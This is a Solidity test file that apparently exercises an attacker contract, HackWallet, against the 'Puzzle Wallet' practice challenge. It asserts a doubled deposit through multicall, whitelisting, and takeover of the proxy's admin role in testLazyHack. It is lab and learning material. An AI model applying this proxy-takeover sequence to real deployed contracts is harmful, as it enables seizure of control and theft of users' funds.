// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.8.0;

import "ds-test/test.sol";
import '../PuzzleWalletFactory.sol';
import '../PuzzleWallet.sol';
import '../HackWallet.sol';

interface CheatCodes {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, uint) external;
}

contract ContractTest is DSTest {
    PuzzleWalletFactory factory;
    PuzzleProxy puzzleproxy;
    PuzzleWallet puzzlewallet;
    address logic;
    CheatCodes cheat;
    address payable player = address(2);
    HackWallet hack;

    function setUp() public {
        factory = new PuzzleWalletFactory();
        cheat = CheatCodes(HEVM_ADDRESS);
        logic = factory.createInstance{value:0.001 ether}(player);
        puzzleproxy = PuzzleProxy(payable(logic));
        puzzlewallet = PuzzleWallet(payable(logic));
        cheat.prank(player);
        hack = new HackWallet(logic);
        //player.transfer(1 ether);
        cheat.deal(player, 1 ether);   
    }

    function xtestDeploymentWithFactory() public {
        //assertTrue(true);
        emit log_address(address(factory));
        emit log_address(address(this));
        emit log_address(address(hack));
        emit log_address(hack.gamer());
        emit log_uint(address(this).balance);
        emit log_uint(player.balance);
        emit log_address(logic);
    }

    function testLogicnProxydep() public {
        logic = factory.createInstance{value:0.001 ether}(address(1));
        emit log_address(logic);
        assertEq(factory.proxyAd(), logic);
    }

    function testOwnerChangeAfterHackDepl() public {
        (,bytes memory data) = logic.call(abi.encodeWithSignature('owner()'));
        emit log_bytes(data);
        emit log_address(address(hack));
    }

    function testCallMulticallfromHack() public {
        cheat.prank(player);
        hack.callMulticall{value: 0.001 ether}();
        assertEq(puzzlewallet.balances(address(hack)), 0.002 ether);
    }

    function testWhitelisted() public {
        assertEq(puzzlewallet.whitelisted(address(hack)), true);
    }

    function testLazyHack() public {
        cheat.startPrank(player);  
        hack.callMulticall{value: 0.001 ether}();
        hack.callExecute();
        hack.callSetMaxBalance();
        cheat.stopPrank();
        assertEq(puzzleproxy.admin(), player);
    }
}
